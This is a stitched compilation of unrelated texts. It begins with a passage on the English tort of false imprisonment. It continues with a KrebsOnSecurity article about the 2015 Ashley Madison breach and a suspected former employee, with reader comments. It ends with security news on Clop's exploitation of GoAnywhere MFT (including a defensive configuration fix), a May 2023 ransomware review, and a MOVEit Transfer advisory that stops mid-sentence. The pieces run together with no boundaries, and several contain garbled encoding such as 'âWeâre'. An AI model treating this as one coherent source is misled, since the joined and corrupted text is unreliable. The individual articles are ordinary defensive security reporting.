 It is still false imprisonment even where the claimant does not know at the time. So secretly locking someone in a room is false imprisonment. It may also be false imprisonment where a person is rendered unconscious, for example, by being punched (also a battery), or when their drink is spiked by drugs (also wilful harm or negligence), because their freedom of movement is thereby restricted.[26]  For example, in the case of Meering v Grahame-White Aviation [1918][27] the claimant was told to stay in an office because property was going missing and if they tried to leave the office they would have been stopped. This was held to be a false imprisonment even though the claimant did not know they were being imprisoned.
 Can the tort of false imprisonment be committed by omission?
 In the majority of circumstances/generally, the answer is no, as there must be a positive act. Yet, in certain circumstances defendants may still be found liable if they are under a positive obligation to release the claimant and the claimant has the legal right to be released. In the case of Prison Officer's Association v Iqbal[28] where a defendant could not leave their cell due to the prison officers being on strike, it was held at [61] that:
 'It seems to me that the general rule that an omission or refusal to release the claimant from confinement will not amount to false imprisonment should not be overridden save in circumstances where the claimant has a legal right to be released and the defendant is under a positive obligation to release the claimant.'[28] Thus, the defendants were liable for omission under the tort of false imprisonment.
 Moreover, in the case of R v Governor of Brockhill Prison, ex p Evans,[15] where the claimant should be released from prison and they weren't, due to a genuine mistake meaning they were held in prison for longer, this was still held to be false imprisonment.
 This can be looked at as consent, therefore, the imprisonment is not unlawful nor false imprisonment, for example, when flying, you consent to be on the plane for that duration of time through contract. The courts have said it is not unlawful to refuse to open a train door when the train is on a bridge, even though the passenger is thereby restricted inside the train.[13] Likewise, a master of a ship,[29] or the pilot of a plane[30] can detain people during a voyage or flight when they have a reasonable cause or grounds to believe it necessary for the safety of their other passengers. Suddenly saying ""I would like to leave now"" is dangerous and thus, they have no reason to let you leave, moreover, you are contractually obligated to remain onboard. Therefore, this would not constitute false imprisonment.
 Additionally, when a claimant is following a work contract the employer may not be held for false imprisonment for not allowing them to leave early due to a breach of contract and potential losses that could result from them leaving. In the case of Herd v Weardale Steel Coal[31] where the claimant was in a mine, they were working and they wanted to leave the mine. The employer refused to let them leave at that time and the court held that the employer was under no obligation to allow them to do so.
 Under English law, police have the right to arrest under a warrant issued by a magistrate,[13] and following conditions set out in PACE Code G.  Or without a warrant, police may make an arrest pursuant to the Police and Criminal Evidence Act 1984:[32] 'anyone who is about to commit, is committing or has committed an offence or is so suspected on reasonable grounds may be arrested.' Also, arrest may be lawful if the police have reason to believe that the person arrested poses an imminent risk of harm to themselves or others. Private citizens can also make an arrest for crimes being committed/that have been committed but only in relation to indictable offences ('citizen's arrest').[13] When a prisoner is lawfully held, it is not false imprisonment just because the conditions are unsanitary such as in the case of R v Deputy Governor of Parkhurst Prison,[33] 'although this may instead be found to be negligence or the tort of misfeasance in a public office.'[13]
 Another example would again be the case of Austin v Commissioner of Police of the Metropolis [2007],[24] a case concerning the alleged unlawful detention of hundreds of members of the public during the May Day riots of 2001 in London, England. The police, using the tactic of ""kettling"", held a large crowd in Oxford Circus without allowing anyone to leave. Lois Austin, a peaceful protester who had not broken the law, and Geoffrey Saxby, an innocent passer-by who was not involved in the demonstration, claimed that they were falsely imprisoned by the London Metropolitan Police and that their detention was in breach of the European Convention of Human Rights.[34] The pair lost their court action in 2005,[35] when the High Court ruled that the police had not acted unlawfully. An appeal against the ruling also failed in 2007.[35] A ruling by the House of Lords declared that 'even in the case of an absolute right, the High Court was entitled to take the ""purpose"" of the deprivation of liberty into account before deciding if human rights law applied at all.'[36]
 Defences for false imprisonment include consent and performance of a contract. Moreover, the defence of illegality may also apply, therefore if the defendant was acting illegally and you locked them in a room to protect yourself whilst you called the police this defence could also apply. However, if the use of force or in this case imprisonment was unreasonable, this would not be a viable defence, as is shown in the case of Revil v Newbery[37] where a homeowner fired a shotgun to the burglar and ended up injuring him, this was held to be an unreasonable use of force and thus, the defence of illegality was void.
 If the false imprisonment was for a minimal amount of time, the claimant could be entitled to nominal damages, as this tort is actionable per se. In Walker v Commissioner of the Police of the Metropolis [2014][19] where someone was stopped in a doorway for a couple of seconds this was still held to be false imprisonment. Additionally, if the applicant was injured through trying to escape using reasonable methods they may be entitled to compensatory damages. Finally, if the claimant suffered an 'affront to their dignity',[13] they may be awarded aggravated damages (these are very rare). For example, in the case of Hook v Cunard Steamship Co Ltd[38] the sailor was confined to his quarters and accused of child molestation but with 'no vestige of grounds in support',[38] this was held to be false imprisonment and aggravated damages were available due to this causing humiliation and injury to the claimant's feelings.[13]

KrebsOnSecurity,https://krebsonsecurity.com/2023/07/seo-expert-hired-and-fired-by-ashley-madison-turned-on-company-promising-revenge/#more-64197,"[This is Part II of a story published here last week on reporting that went into a new Hulu documentary series on the 2015 Ashley Madison hack.] It was around 9 p.m. on Sunday, July 19, when I received a message through the contact form on KrebsOnSecurity.com that the marital infidelity website AshleyMadison.com had been hacked. The message contained links to confidential Ashley Madison documents, and included a manifesto that said a hacker group calling itself the Impact Team was prepared to leak data on all 37 million users unless Ashley Madison and a sister property voluntarily closed down within 30 days. A snippet of the message left behind by the Impact Team. The message included links to files containing highly sensitive information, including snippets of leaked user account data, maps of internal AshleyMadison company servers, employee network account information, company bank account data and salary information. A master employee contact list was among the documents leaked that evening. Helpfully, it included the cell phone number for Noel Biderman, then the CEO of Ashley Madison parent firm Avid Life Media (ALM). To my everlasting surprise, Biderman answered on the first ring and acknowledged they’d been hacked without even waiting to be asked. âWeâre on the doorstep of [confirming] who we believe is the culprit, and unfortunately that may have triggered this mass publication,â Biderman told me on July 19, just minutes before I published the first known public report about the breach. âIâve got their profile right in front of me, all their work credentials. It was definitely a person here that was not an employee but certainly had touched our technical services.â On Aug 18, 2015, the Impact Team posted a âTimeâs up!â message online, along with links to 60 gigabytes of Ashley Madison user data. The data leak led to the public shaming and extortion of many Ashley Madison users, and to at least two suicides. Many other users lost their jobs or their marriages. To this day, nobody has been charged in the hack, and incredibly Ashley Madison remains a thriving company. The former employee that Biderman undoubtedly had in mind on July 19, 2015 was William Brewster Harrison, a self-described expert in search engine optimization (SEO) tricks that are designed to help websites increase their rankings for various keywords in Google and other search engines. It is evident that Harrison was Biderman’s top suspect immediately after the breach became public because — in addition to releasing data on 37 million users a month later in August 2015 — the hackers also dumped three years worth of email they stole from Biderman. And Biderman’s inbox is full of messages about hate-filled personal attacks from Harrison. A Native of Northern Virginia, Harrison eventually settled in North Carolina, had a son with his then-wife, and started a fence-building business. ALM hired Harrison in March 2010 to promote its various adult brands online, and it is clear that one of his roles was creating and maintaining female profiles on Ashley Madison, and creating blogs that were made to look like they were written by women who’d just joined Ashley Madison. A selfie that William B. Harrison posted to his Facebook page in 2013 shows him holding a handgun and wearing a bulletproof vest. It appears Harrison was working as an affiliate of Ashley Madison prior to his official employment with the company, which suggests that Harrison had already demonstrated he could drive signups to the service and help improve its standing in the search engine rankings. What is less clear is whether anyone at ALM ever performed a basic background check on Harrison before hiring him. Because if they had, the results almost certainly would have given them pause. Virginia prosecutors charged the young 20-something Harrison with a series of misdemeanors, including trespassing, unlawful entry, drunk in public, and making obscene phone calls. In 2008, North Carolina authorities charged Harrison with criminal extortion, a case that was transferred to South Carolina before ultimately being dismissed. In December 2009, Harrison faced charges of false imprisonment, charges that were also dropped by the local district attorney. By the time Ashley Madison officially hired him, Harrison’s life was falling apart. His fence business had failed, and he’d just filed for bankruptcy. Also, his marriage had soured, and after a new arrest for driving under the influence, he was in danger of getting divorced, losing access to his son, and/or going to jail. It also seems likely that nobody at ALM bothered to look at the dozens of domain names registered to Harrison’s various Vistomail.com email addresses, because had they done so they likely would have noticed two things. One is that Harrison had a history of creating websites to lambaste companies he didn’t like, or that he believed had slighted him or his family in some way. Some of these websites included content that defamed and doxed executives, such as bash-a-business[.]com, google-your-business[.]com, contact-a-ceo[.]com, lowes-is-a-cancer[.]com (according to Harrison, the home improvement chain once employed his wife). A background check on Harrison’s online footprint also would have revealed he was a self-styled rapper who claimed to be an active menace to corporate America. Harrison’s website lyrical-gangsta[.]com included a number of works, such as “Slim Thug — I Run — Remix Spoof,” which are replete with menacing words for unnamed corporate executives: [HOOK]

Imma run the Net til im six feet under
I’m a leave my mark — no reason to wonder
(Yea Yea) Some of the anti-corporate rhymes busted by Harrison’s hacker/rapper alter ego “Chaos Dog.” Image: Archive.org. The same theme appears in another rap (“The Hacker Backstage”) penned by Harrison’s rapper alter ego — “Chaos Dog:” …this hacker was born to write
bust off the rhymes and watch em take flight
you know all about them corporate jets
and handing out pinkslips without regrets
oversized companies are the problem well, I’ve got a solution
It’s called good ol’ fashioned retribution
file bankruptcy, boycott you like Boston colonists
Corporate America cant stop this Eminem style columnist
2pac would have honored my style
Im the next generation of hacker inspiration
Americans don’t want a corporate nation
All that DOW Jones shit is a dying sensation In addition to pimping Ashley Madison with fake profiles and phony user blogs, it appears Harrison also went after the company’s enemies during the brief time he was an employee. As noted in Part I of this story, Harrison used multiple pseudonymous Vistomail.com email addresses to harass the owners of AshleyMadisonSucks[.]com into selling or shutting down the site. When the owner of AshleyMadisonSucks[.]com refused to sell the domain, he and his then-girlfriend were subject to an unrelenting campaign of online harassment and blackmail. It now appears those attacks were perpetrated by Harrison, who sent emails from different accounts at the free email service Vistomail pretending to be the domain owner, his then-girlfriend and their friends. Harrison even went after the domain owner’s lawyer and wife, listing them both on his Contact-A-CEO[.]com website. Things started going sideways for Ashley Madison when Harrison’s employment contract was terminated in November 2011. The leaked emails do not explain why Harrison was fired, but his mercurial temperament likely played a major role. According to Harrison, it was because he had expressed some moral reservations with certain aspects of his duties, although he was not specific on that point and none of this could be confirmed. Shortly after Harrison was fired, the company’s executives began noticing that Google was auto-completing the words “Jew” and “Jewish” whenever someone searched for Biderman’s name. The results returned when one accepted Google’s recommended search at the time filled the first page with links to Stormfront, a far-right, neo-Nazi hate group. The company strongly suspected someone was using underhanded SEO techniques to slander and attack its CEO. In July 2022, KrebsOnSecurity published a retrospective on the 2015 Ashley Madison breach which found that Biderman had become the subject of increasing ire from members of Stormfront and other extremists groups in the years leading up to the hack. According to the neo-Nazi groups, Biderman was a worthy target of their harassment not just because he was a successful Jewish CEO, but also because his company was hellbent on destroying Christian morals and families. Biderman’s leaked emails show that in February 2012 he hired Brian Cuban — the attorney brother of Mark Cuban, the owner of the Dallas Mavericks and one the main “sharks” on the ABC reality television series Shark Tank. Through Cuban, Ashley Madison appealed their case to both Google and to the Anti-Defamation League, but neither was apparently able or willing to help.  Also in early January 2012, Biderman and other Ashley Madison executives found themselves inundated with anonymous Vistomail.com emails that were replete with profanity and slurs against Jews. Although he used fake names and email addresses, Harrison made little effort to hide his identity in several of these nastygrams. One particularly ugly message from Harrison even included a link to a Youtube video he’d put online of his young son playing basketball for a school team. That Youtube video was included in an email wherein Harrison – then separated from his wife — lamented all the hours he spent working for Ashley Madison up in Canada instead of spending time with his son. Harrison then turned to making threatening phone calls to Ashley Madison executives. In one incident in March 2012, Harrison called the company’s former director of Human Resources using a caller ID spoofing service to make it look like he was calling from inside the building. ALM’s lawyers contacted the Toronto police in response to Harrison’s harassment. “For Will to have disguised his phone number as Markâs strongly suggest he has hacked my email, legal counsel for the opposing side in a perceived legal dispute,” ALM VP and general counsel Mike Dacks wrote in a letter to a detective at the Toronto Police. “Over the months of his many hundreds of emails he alluded a number of times to undertaking cyberattacks against us and this was noted in my original report to police.” Based on the exchanges in Bidernman’s inbox it appears those appeals to the Toronto authorities were successful in having Harrison barred from being able to enter Canada. ALM also contacted a detective in Harrison’s home county in North Carolina. But when the local police paid a visit to Harrison’s home to follow up on the harassment complaints, Harrison fled out his back porch, injuring himself after jumping off the second-story deck. It is unclear if the police ever succeeded in interviewing Harrison in response to the harassment complaints from ALM. The Raleigh police officer contacted by ALM did not respond to requests for information. But the visit from the local cops only seemed to embolden and anger Harrison even more, and Biderman’s emails indicate the harassment continued after this incident. Then in August 2012, the former sex worker turned blogger and activist Maggie McNeill published screenshots from an internal system that Ashley Madison used called the “Human Decoy Interface,” which was a fancy way of describing a system built to manage phony female accounts on the service. The screenshots appeared to show that a great many female accounts were in fact bots designed to bring in paying customers. Ashley Madison was always free to join, but users had to pay if they wished to chat directly with other users. Although Harrison had been fired nearly a year earlier, Biderman’s leaked emails show that Harrison’s access to Ashley Madison’s internal tools wasn’t revoked until after the screenshots were posted online and the company began reviewing which employee accounts had access to the Human Decoy Interface. âWho or what isÂ asdfdfsda@asdf.com?,â Biderman asked, after being sent a list of nine email addresses. âIt appears to be the email address Will used for his profiles,â the IT director replied. âAnd his access was never shut off until today?,â asked the companyâs general counsel Mike Dacks. Biderman’s leaked emails suggest that Harrison stopped his harassment campaign sometime after 2012. A decade later, KrebsOnSecurity sought to track down and interview Harrison. Finding nobody at his former addresses and phone numbers in North Carolina, KrebsOnSecurity wound up speaking with Will’s stepmother, who lives with Will’s dad in Northern Virginia and asked that her name not be used in this story. Will’s stepmom quickly dropped two big truth bombs after patiently listening to my spiel about why I was calling and looking for Mr. Harrison. The first was that Will was brought up Jewish, although he did not practice the faith: A local rabbi and friend of the family gave the service at Will’s funeral in 2014. She also shared that her stepson had killed himself in 2014, shooting himself in the head with a handgun. Will’s mother discovered his body. “Will committed suicide in March 2014,” Will’s stepmother shared. “I’ve heard all those stories you just mentioned. Will was severely mentally ill. He was probably as close to a sociopath as I can imagine anyone being. He was also a paranoid schizophrenic who wouldn’t take his medication.” William B. Harrison died on March 5, 2014, nearly 16 months before The Impact Team announced they’d hacked Ashley Madison. Will’s stepmom said she constantly felt physically threatened when Will was around. But she had trouble believing that her stepson was a raging anti-Semite. She also said she thought the timing of Will’s suicide effectively ruled him out as a suspect in the 2015 Ashley Madison hack. “Considering the date of death, Iâm not sure if heâs your guy,” she offered toward the end of our conversation. [There is one silver lining to Will Harrison’s otherwise sad tale: His widow has since remarried, and her new husband agreed to adopt their son as his own.] Does Harrison’s untimely death rule him out as a suspect, as his stepmom suggested? This remains an open question. In a parting email to Biderman in late 2012, Harrison signed his real name and said he was leaving, but not going away. “So good luck, I’m sure we’ll talk again soon, but for now, I’ve got better things in the oven,” Harrison wrote. “Just remember I outsmarted you last time and I will outsmart you and out maneuver you this time too, by keeping myself far far away from the action and just enjoying the sideline view, cheering for the opposition.” Nothing in the leaked Biderman emails suggests that Ashley Madison did much to revamp the security of its computer systems in the wake of Harrison’s departure and subsequent campaign of harassment — apart from removing an administrator account of his a year after he’d already left the company. KrebsOnSecurity found nothing in Harrison’s extensive domain history suggesting he had any real malicious hacking skills. But given the clientele that typically employed his skills — the adult entertainment industry — it seems likely Harrison was at least conversant in the dark arts of “Black SEO,” which involves using underhanded or else downright illegal methods to game search engine results. Armed with such experience, it would not have been difficult for Harrison to have worked out a way to maintain access to working administrator accounts at Ashley Madison. If that in fact did happen, it would have been trivial for him to sell or give those credentials to someone else. Or to something else. Like Nazi groups. As KrebsOnSecurity reported last year, in the six months leading up to the July 2015 hack, Ashley Madison and BidermanÂ became a frequent subject of derision across multiple neo-Nazi websites. On Jan. 14, 2015, a member of the neo-Nazi forum Stormfront posted a lively thread about Ashley Madison in the general discussion area titled, âJewish owned dating website promoting adultery.â On July 3, 2015,Â Andrew Anglin, the editor of the alt-right publicationÂ Daily Stormer, posted excerpts about Biderman from a story titled, âJewish Hyper-Sexualization of Western Culture,â which referred to Biderman as the âJewish King of Infidelity.â On July 10, a mocking montage of Biderman photos with racist captions was posted to the extremist websiteÂ Vanguard News Network, as part of a thread called âJews normalize sexual perversion.â Some readers have suggested that the data leaked by the Impact Team could have originally been stolen by Harrison. But that timeline does not add up given what we know about the hack. For one thing, the financial transaction records leaked from Ashley Madison show charges up until mid-2015. Also, the final message in the archive of Bidermanâs stolen emails was dated July 7, 2015 â almost two weeks before the Impact Team would announce their hack. Whoever hacked Ashley Madison clearly wanted to disrupt the company as a business, and disgrace its CEO as the endgame. The Impact Team’s intrusion struck just as Ashley Madison’s parent was preparing go public with an initial public offering (IPO) for investors. Also, the hackers stated that while they stole all employee emails, they were only interested in leaking Biderman’s. Also, the Impact Team had to know that ALM would never comply with their demands to dismantle Ashley Madison and Established Men. In 2014, ALM reported revenues of $115 million. There was little chance the company was going to shut down some of its biggest money machines. Hence, it appears the Impact Teamâs goal all along was to create prodigious amounts of drama and tension by announcing the hack of a major cheating website, and then let that drama play out over the next few months as millions of exposed Ashley Madison users freaked out and became the targets of extortion attacks and public shaming. After the Impact Team released Biderman’s email archives, several media outlets pounced on salacious exchanges in those messages as supposed proof he had carried on multiple affairs. Biderman resigned as CEO of Ashley Madison on Aug. 28, 2015. Complicating things further, it appears more than one malicious party may have gained access to Ashley’s Madison’s network in 2015 or possibly earlier. Cyber intelligence firm Intel 471Â recorded a series of posts by a user with the handle âBrutiumâ on the Russian-language cybercrime forumÂ AntichatÂ between 2014 and 2016. Brutium routinely advertised the sale of large, hacked databases, and on Jan. 24, 2015, this user posted a thread offering to sell data on 32 million Ashley Madison users. However, there is no indication whether anyone purchased the information. Brutiumâs profile has since been removed from the Antichat forum. I realize this ending may be unsatisfying for many readers, as it is for me. The story I wrote in 2015 about the Ashley Madison hack is still the biggest scoop I’ve published here (in terms of traffic), yet it remains perhaps the single most frustrating investigation I’ve ever pursued. But my hunch is that there is still more to this story that has yet to unfold. _x000D_

          “Bidermanâs leaked emails show that in February 2021 he hired Brian Cuban” Is this mean to be 2012, not 2021? Yes that is a typo. Thanks. I am shocked, shocked to discover that someone hired to catfish people on a cheaters website would have anything other than an unblemished police record and history. Great piece of detective work, as always! So was Mr. Harrison actually wrong about Biderman in any way? Sounds like a good man fighting against evil to me. Just remember what one of the ten commandments was. So this was happening way before Ashley site created. Many years we have Backpage allowing ads for solicitation and we had Craigslist up until 2 years ago or so. There’s thousands of p*** XXX sites and hundreds if not thousands of so-called dating sites Great reporting Brian. I’m glad I never even signed up, simply to just take an innocent peek at the babes – for research purposes, of course. Kreb, how does statue of limitations play a roll in prosecuting this? I was under the impression most cyber crimess have a 5 year statue of limitations Thanks One thing I don’t understand – “remains a thriving company”? When around the time of the hack, it was also reported that something like 90% of the users were male, and they were using chatbots to stand in for women? The company can thrive as long as a significant portion of those men are paying for DMs. Hell, there are probably a lot of them that forgot to turn off the auto-bill and can’t remember what the name they bill under is actually for. Good reporting and good reading, as always, Brian!  It’s not unreasonable to think that Harrison could have sold off his access or accounts or credentials of some type to multiple parties before he died.  It could be what he meant by watching from the sidelines, but it implies he knew “something” would happen. “But my hunch is that there is still more to this story that has yet to unfold. And we look forward to your coverage of the story What’s really funny about this anti-jewish person is that in the p*** business probably 98 % of people percentage wise are christian. Of course you got to be really sick to be this mean back at someone who fired you for whatever reason you have. “in the p*** business probably 98 % of people percentage wise are christian.” Where do you get this statistic? Brian, isn’t this old news?  Slow day for new stories, perhaps?  I “suppose” I may get around to watching the story on Hulu if it’s free, but I have little interest in the machinations of a psychotic, hate groups, or Mr. Biderman going after each other, except for the drama it momentarily provides.  That’s entertainment, innit? Great reporting, great writing, and (at least to me) an interesting topic.  Thanks for sharing your talents. Hi, Brian! What’s new about Pavel “Coq de Prison” Vrublesky? Hope he’s well and ready for his long-long imprisonment. How do you think how many years it will be about? I hope 15 years minimum in maximum security prison. My personal hunch is that Harrison gave access to a malicious actor or a neo nazi member could have preparated it. Something has gotta tie in with why they targeted the CEO and the companies reputation rather than just extortion. It may be worth reaching out to hackers who were selling the database for any insight, if at all possible. This is what I was looking for. Thanks for the sharing this kind of informative post.

 According to information gathered by BleepingComputer, the Clop ransomware group has claimed responsibility for the ransomware attacks that are tied to a vulnerability in the Fortra GoAnywhere MFT secure file-sharing solution. As we reported on February 8, Fortra released an emergency patch (7.1.2) for an actively exploited zero-day vulnerability found in the GoAnywhere MFT administrator console. GoAnywhere MFT, which stands for managed file transfer, allows businesses to manage and exchange files in a secure and compliant way. According to its website, it caters to more than 3,000 organizations, predominantly ones with over 10,000 employees and 1B USD in revenue. Some of these organizations are considered vital infrastructure such as local governments, financial companies, healthcare organizations, energy firms, and technology manufacturers. The day after the release of the GoAnywhere patch, the Clop ransomware gang contacted BleepingComputer and said they had used the flaw over ten days to steal data from 130 companies. At the time it was impossible to confirm this claim, but after two earlier victims, Community Health Systems (CHS) and Hatch Bank disclosed that data was stolen in the GoAnywhere MFT attacks, the Clop leak site now shows seven new companies. At least two of them reportedly have been breached using the GoAnywhere MFT vulnerability. The Common Vulnerabilities and Exposures (CVE) database lists publicly disclosed computer security flaws. The CVE of the exploited vulnerability is CVE-2023-0669, and described as a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled object. It is unknown whether these victims were targeted during the time that there was no patch available for the vulnerability or later. Recent scans showed that around 1,000 administrative consoles are publicly exposed to the internet. The Web Client interface, which is the one that is normally accessible from the public internet, is not susceptible to this exploit, only the administrative interface. If your GoAnywhere MFT administration portal is exposed to the Internet, you are under urgent advice to download the security patch from the Product Downloads tab at the top of the GoAnywhere account page which you will see after logging in. If for some reason you can't install the patch, Fortra says you should follow the mitigation steps it put out, which involves implementing some access control wherein the administrator console interface should only be accessed from trusted sources, or disabling the licensing service altogether. There is also a technical mitigation configuration shared in the advisory that is only visible after logging in (which can be done with a free account if you are interested). On the file system where GoAnywhere MFT is installed, edit the file [install_dir]/adminroot/WEB_INF/web.xml  Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.  Before:  <servlet>       <servlet-name>License Response Servlet</servlet-name>       <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>       <load-on-startup>0</load-on-startup>  </servlet>  <servlet-mapping>       <servlet-name>Licenses Response Servlet</servlet-name>       <url-pattern>/lic/accept/</url-pattern>   After:  <!--  Add these tags to comment out the following section (as shown) or simply delete this section if you are not familiar with XML comments  <servlet>       <servlet-name>License Response Servlet</servlet-name>       <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>       <load-on-startup>0</load-on-startup>  </servlet>  <servlet-mapping>       <servlet-name>Licenses Response Servlet</servlet-name>       <url-pattern>/lic/accept/</url-pattern>  </servlet-mapping>   -->   Restart the GoAnywhere MFT application If GoAnywhere MFT is clustered, this change needs to happen on every instance node in the cluster.

 This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim didn't pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher. In May, Lockbit, usually the reigning king of ransomware, found a fierce competitor in MalasLocker. Last month also witnessed a record number of 556 reported ransomware victims, the unusual emergence of Italy and Russia as major targets, and a significant rise in attacks on the education sector. Let's jump right in with MalasLocker, who burst onto the scene last month with 171 total victims—beating out LockBit (76) by almost 100 known attacks. This isn't the first time this year a gang has overhauled LockBit and climbed to the top spot on our monthly charts. In April Cl0p rose to the number one spot by compromising over 100 victims with a zero-day vulnerability in the widely-used managed file transfer software GoAnywhere MFT. This month, MalasLocker's meteoric rise to the top can be explained along similar lines. MalasLocker attacked vulnerabilities in Zimbra servers, including CVE-2022-24682, to enable remote code execution (RCE). Zimbra Collaboration, formerly known as the Zimbra Collaboration Suite (ZCS) is a collaborative software suite that includes an email server and a web client. What sets MalasLocker most apart, however, is its unique 'charitable' twist. Rather than demanding ransoms, it asked victims to donate to its approved charities. Needless to say, it is highly unusual for a ransomware gang to purport to attack organizations on altruistic grounds. We haven't seen it once since keeping track of gangs in early 2022.  ""Unlike traditional ransomware groups, we're not asking you to send us money. We just dislike corporations and economic inequality,"" reads the MalasLocker ransom note README.txt. One might assume that a ransomware gang principally opposed to corporations and economic inequality might disproportionately target larger and more wealthy organizations, but this isn't necessarily the case. The gang's blog suggests it's open to targeting businesses of all sizes, so long as they aren't located in ""Latin America, Africa, or other colonized countries."" We are completely unmoved by MalasLocker's supposed altruism. Ransomware gangs (and cybercriminals in general) have a long and storied history of writing long and tedious tracts justifying their criminal activity with grandiose claims. MalasLocker is no different. We read its manifesto so you don't have to, and the only line you need to pay any attention to is the one that reads ""so we will become just another ransomware group."" So far, we have no confirmation that MalasLocker is keeping its word for a decryptor when a victim donates money to a charity. The upswing in ransomware activity in Italy and Russia in May is striking. Both countries were propelled into the top three most targeted nations in May, a list typically dominated by the USA and the UK. Italy saw more than a six-fold increase from the month before, and Russia went from zero reported attacks to 50 in a single month. For comparison, Italy had only eight reported ransomware incidents in April, while Russia wasn't even listed. Similarly, in March, Russia had no reported incidents, and Italy had just eight. The surge in attacks on these two countries is entirely due to MalasLocker, which hit more targets in Russia and Italy than anywhere else. We assume that this is not a matter of deliberate targeting but simply a matter of where there were vulnerable targets.  Known MalasLocker attacks by country, May 2023 Traditionally, most ransomware gangs have avoided targeting Russia and the Commonwealth of Independent States (CIS) to prevent attracting the attention of local authorities who otherwise turn a blind eye to them. Either MalasLocker isn't based in the CIS and therefore doesn't fear the Federal Security Service (FSB), or they are going to have a very short stay in the ransomware charts. The increase in ransomware attacks on the education sector in May is particularly concerning. May saw 30 known attacks—the highest we've seen in a single month since we started keeping records in early 2022, and the continuation of a trend that has seen a sustained increase over the past twelve months.  Known ransomware attacks against education, June 2022-May 2023 Between June 2022 and May 2023, Vice Society attacked more education targets than any other gang—a specialization that should alarm schools, colleges, and universities everywhere. Ransomware gangs seem to be adopting a new modus operandi: Exploiting known vulnerabilities for multi-target attacks. This year we have seen Cl0p and MalasLocker attack multiple targets simultaneously with (presumably automated) targeting of specific system weaknesses, expanding the scale and impact of their ransomware operations. Cl0p, for example, has a history of exploiting platforms like Accellion FTA and GoAnywhere MFT. In April, it shifted its focus to a vulnerability in another popular platform, PaperCut. In June, as we prepared this report, it emerged that Cl0p was been exploiting yet another vulnerability, this time in the widely used file transfer software MOVEit Transfer. The gang started exploiting the vulnerability on May 27th, during the US Memorial Day holiday. A security bulletin released on May 31, 2023 by Progress Software states: “A SQL injection vulnerability has been found in the MOVEit Transfer web application that could allow an un-authenticated attacker to gain unauthorized access to MOVEit Transfer's database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements.“ This approach is unusual and should concern us all because it has the potential to make ransomware attacks more scalable. BlackSuit is a new ransomware that is strikingly similar to Royal, sharing 98% of its code. Last month, BlackSuit targeted both Windows and Linux hosts.  BalckSuit could be a new variant developed by Royal's authors, a mimicry attempt using similar code, an affiliate of the Royal ransomware gang running its own modifications, or even a breakaway group from the Royal ransomware gang. Rancoz is a new ransomware variant which shares similarities with Vice Society. Its sophistication lies in its ability to modify existing code from leaked source codes to target specific industries, organizations, or geographic regions, increasing its attack efficacy and ability to evade detection. 8Base is a newly discovered ransomware gang which, despite only recently gaining attention, has been in operation since April 2022. In May, it had a total of 67 victims. Predominantly targeting small and medium-sized businesses (SMBs), 8Base has attacked mainly companies within the Professional/Scientific/Technical sector, comprising 36% of known attacks, followed by Manufacturing at 17%. Geographical analysis of the victims suggests a concentration in America and Europe, with the United States and Brazil being the most targeted countries. RA Group is a new ransomware primarily focusing its attacks on pharmaceutical, insurance, wealth management, and manufacturing firms located in the United States and South Korea.  The RA Group employs an encryptor derived from the leaked source code of Babuk ransomware, an operation that ceased in 2021. The encryptor employs intermittent encryption, which alternates between encrypting and not encrypting sections of a file to expedite the encryption process, but leaves some data partially recoverable.  Malwarebytes EDR and MDR removes all remnants of ransomware and prevents you from getting reinfected.

 On Friday June 2, 2023 we reported about a MOVEit Transfer vulnerability that was actively being exploited. If your organization uses MOVEit Transfer and you haven’t patched yet, it really is time to move it. Excuse the bad pun, but yesterday we saw the first victims of this vulnerability come forward. MOVEit Transfer is a widely used file transfer software which encrypts files and uses secure File Transfer Protocols to transfer data. As such, it has a large userbase in healthcare, education, US federal and state government, and financial institutions. The Common Vulnerabilities and Exposures (CVE) database lists publicly disclosed computer security flaws. On Friday the CVE had not been assigned yet, but now this vulnerability has now been listed as: CVE-2023-34362: In Progress MOVEit Transfer before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1), a SQL injection vulnerability has been found in the MOVEit Transfer web application that could allow an unauthenticated attacker to gain access to MOVEit Transfer's database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker may be able to infer information about the structure and contents of the database, and execute SQL statements that alter or delete database elements. NOTE: this is exploited in the wild in May and June 2023; exploitation of unpatched systems can occur via HTTP or HTTPS. All versions (e.g., 2020.0 and 2019x) before the five explicitly mentioned versions are affected, including older unsupported versions. Microsoft says that the group behind the attacks on MOVEit instances is the Lace Tempest group, which is a known ransomware operator and runs the extortion website Cl0p. This was confirmed by a Cl0p representative to Bleeping Computer, who also said that the criminals started exploiting the vulnerability on May 27th, during the US Memorial Day holiday. We saw a similar scenario unfold in March which caused Cl0p to occupy the first place as most used ransomware in our Ransomware Review for that month. Contributing to Cl0p's rise to the number one spot was its extensive GoAnywhere campaign. The group successfully breached over 104 organizations by taking advantage of a zero-day vulnerability in the widely-used managed file transfer software, GoAnywhere MFT. As we have pointed out before, ransomware gangs can afford to play the long game now. And some of them do. When you have hundreds or maybe even thousands of victims to choose from, you start with the juiciest ones that are most likely to pay. Payroll provider Zellis who serves British Airways and the BBC would be a good example of that. Pharmacy chain Boots, which employs more than 57,000 people in the UK and Ireland, has also announced that it has been impacted. A Reuters reporter that has an inside contact in the Cl0p ransomware gang tweeted a screenshot of his contact saying that the military, gov(ernment), children’s hospitals, and police would not be attacked.  The same was repeated by BleepingComputer’s contact. But this is no guarantee, and in the end they may not be able to resist the urge to steal data from those networks anyway. All this means that if your organization uses MOVEit Transfer and it is internet facing, you should assume that your network has been breached. The fact that you haven’t noticed anything yet probably means you are low on the list of desirable targets. It does NOT mean you got away lucky and simply patching the vulnerability is enough. First of all, MOVEit Transfer users should visit the Progress security bulletin about this vulnerability and bookmark it. You can find the latest advice, Indicators of Compromise (IOCs), affected versions, and available patches there. Basically the advice, and you can find detailed instructions on the page, is to: Additionally, users of MOVEit Transfer 